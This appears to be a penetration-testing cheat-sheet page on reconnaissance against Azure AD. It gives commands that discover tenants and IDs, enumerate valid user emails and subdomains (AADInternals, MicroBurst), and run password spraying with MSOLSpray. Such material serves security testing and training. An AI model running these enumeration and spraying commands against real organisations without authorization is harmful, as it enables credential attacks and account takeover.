---
title: Recon
description: The first step to Global Administrator
position: 1
---

# Check if AzureAD is in use

## Manual

We can know if a enterprise is using Azure and has its own tenant querying several Microsoft services:

Knowing if the enterprise has an AAD:

```bash
http https://login.microsoftonline.com/getuserrealm.srf?login={{ Username user@domain.com }}&json=1 --body
```

An example output would be:

```json
{
    "CloudInstanceIssuerUri": "urn:federation:MicrosoftOnline",
    "CloudInstanceName": "microsoftonline.com",
    "DomainName": "rai.usc.es",
    "FederationBrandName": "Universidade de Santiago de Compostela",
    "Login": "user@rai.usc.es",
    "NameSpaceType": "Managed",
    "State": 4,
    "UserState": 1
}
```

Get Tenant ID

```bash
http https://login.microsoftonline.com/{{ Domain domain.com }}/.well-known/openid-configuration --body
```

The tenant ID can be found in many places inside the json returned

```json
{
    "authorization_endpoint": "https://login.microsoftonline.com/{TenantID}/oauth2/authorize",
    [...]
}
```

Check if email is valid

```bash
http POST https://login.microsoftonline.com/common/GetCredentialType Username="{{ Username user@domain.com }}" | jq '.IfExistsResult'
```

Response Codes
* 1 - User Does Not Exist on Azure as Identity Provider
* 0 - Account exists for domain using Azure as Identity Provider
* 5 - Account exists but uses different IdP other than Microsoft
* 6 - Account exists and is setup to use the domain and an IdP other than Microsoft

## [AADInternals](https://github.com/Gerenios/AADInternals)

> Note: This module only works in Windows (arm64 supported)

```bash
Install-Module AADInternals -Scope CurrentUser
Import-Module AADInternals
```

Get Tenant information, name, type...

```powershell
Get-AADIntLoginInformation -UserName {{ Username root@domain.com }}
```

Get Tenant Id

```powershell
Get-AADIntTenantID -Domain {{ Domain domain.com }}
```

Get Tentant domains

```powershell
Get-AADIntTenantDomains -Domain {{ Domain domain.com }}
```

Get all the information 

```powershell
Invoke-AADIntReconAsOutsider -DomainName {{ Domain domain.com }}
```

## [Microburst](https://github.com/NetSPI/MicroBurst)

MicroBurst includes functions and scripts that support Azure Services discovery, weak configuration auditing, and post exploitation actions such as credential dumping. It is intended to be used during penetration tests where Azure is in use.

> Note: This module requires windows becaus it uses AzureAD module which only supports Windows. You can try to run it using AzureADPreview but beware of possible errors

Installation:

```powershell
# Install-Module -Name Az -Scope CurrentUser -Repository PSGallery -Force
# Install-Module -Name AzureAD -Scope CurrentUser -Repository PSGallery -Force
# Install-Module -Name MSOnline -Scope CurrentUser -Repository PSGallery -Force
git clone https://github.com/NetSPI/MicroBurst
cd MicroBurst
Import-Module .\Microburst.psm1 # Takes a moment
```

Enumerate all subdomains for an organization

```powershell
Invoke-EnumerateAzureSubDomains -Base {{ Domain domain.com }} -Verbose
```

# Password spraying

Although this method is not recommended in production or a real assessment it is used in real world scenarios so we'll cover it here.

There are countless tools that can perform this, one of the most known ones is [MSOLSpray](https://github.com/dafthack/MSOLSpray)

```powershell
git clone https://github.com/dafthack/MSOLSpray
cd MSOLSpray
Import-Module ./MSOLSpray.ps1
```

You can check valid emails using this fancy oneliner

```powershell
cat ../emails.txt | %{
    http POST https://login.microsoftonline.com/common/GetCredentialType Username="$_" | jq -r 'select(.IfExistsResult!=1) | .Username'
}
```

Password spraying can be performed using the following command:

```powershell
Invoke-MSOLSpray -UserList ..\emails.txt -Password '{{ Password password }}' -Verbose
```